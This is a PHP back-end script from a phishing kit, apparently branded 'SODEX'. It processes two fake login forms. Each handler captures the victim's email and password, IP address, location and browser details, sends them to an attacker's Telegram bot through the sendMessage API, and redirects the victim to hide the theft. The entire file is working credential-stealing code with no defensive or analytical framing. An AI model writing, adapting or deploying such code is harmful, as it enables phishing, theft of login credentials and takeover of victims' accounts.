<?php 
session_start();
// Variable declaration
$errors = array(); 

if (isset($_POST['email']) && isset($_POST['password'])) {
    include 'recon.php';
    include '../conf/config.php';
    $settings = include '../conf/settings.php';

    // Get User Input
    $_SESSION['email'] = $_POST['email'];
    $_SESSION['password'] = $_POST['password'];

    $ip = getenv("REMOTE_ADDR");
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Store IP and Port in session
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port;

    // Send email
    $body = "OTHER EMAIL 👨‍💻@SODEX\r\n";
    $body .= "|Username: {$_SESSION['email']}\r\n";
    $body .= "|Password: {$_SESSION['password']}\r\n";
    $body .= "|---- I N F O | I P ----|\r\n";
    $body .= "IP Address: {$_SESSION['ip']}\r\n";
    $body .= "Port: {$_SESSION['port']}\r\n";
    $body .= "IP Country: {$_SESSION['country']}\r\n";
    $body .= "IP City: {$_SESSION['city']}\r\n";
    $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= "::: OTHER EMAIL 💚SODEXRICHIE💚 :::\r\n";
    
    if($savetxt == "off"){

    }             

    $subject = "Login Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
    $headers = "From: SODEX <sodex.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    if ($tgresult == "on") {
        $data = $body;
        $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
        $website = "https://api.telegram.org/{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    echo "<script>window.location.href='../../other2.html';</script>";
    exit();
}


if (isset($_POST['email1']) && isset($_POST['password1'])) {
  include 'recon.php';
  include '../conf/config.php';
  $settings = include '../conf/settings.php';

  // Get User Input
  $_SESSION['email1'] = $_POST['email1'];
  $_SESSION['password1'] = $_POST['password1'];

  $ip = getenv("REMOTE_ADDR");
  $port = $_SERVER['REMOTE_PORT'];
  $useragent = $_SERVER['HTTP_USER_AGENT'];

  // Store IP and Port in session
  $_SESSION['ip'] = $ip;
  $_SESSION['port'] = $port;

  // Send email
  $body = "OTHER EMAIL 👨‍💻@SODEX\r\n";
  $body .= "|Email Address: {$_SESSION['email1']}\r\n";
  $body .= "|Password: {$_SESSION['password1']}\r\n";
  $body .= "|---- I N F O | I P ----|\r\n";
  $body .= "IP Address: {$_SESSION['ip']}\r\n";
  $body .= "Port: {$_SESSION['port']}\r\n";
  $body .= "IP Country: {$_SESSION['country']}\r\n";
  $body .= "IP City: {$_SESSION['city']}\r\n";
  $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
  $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
  $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
  $body .= "::: OTHER EMAIL 💚SODEXRICHIE💚 :::\r\n";
  
  if($savetxt == "off"){

  }             

  $subject = "Login Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
  $headers = "From: SODEX <sodex.com>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
  
  if ($tgresult == "on") {
      $data = $body;
      $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
      $website = "https://api.telegram.org/{$settings['bot_url']}";
      $ch = curl_init($website . '/sendMessage');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      $result = curl_exec($ch);
      curl_close($ch);
  }

    // Redirect to Google.com
    header("Location: https://www.google.com");
  exit();
}

?>
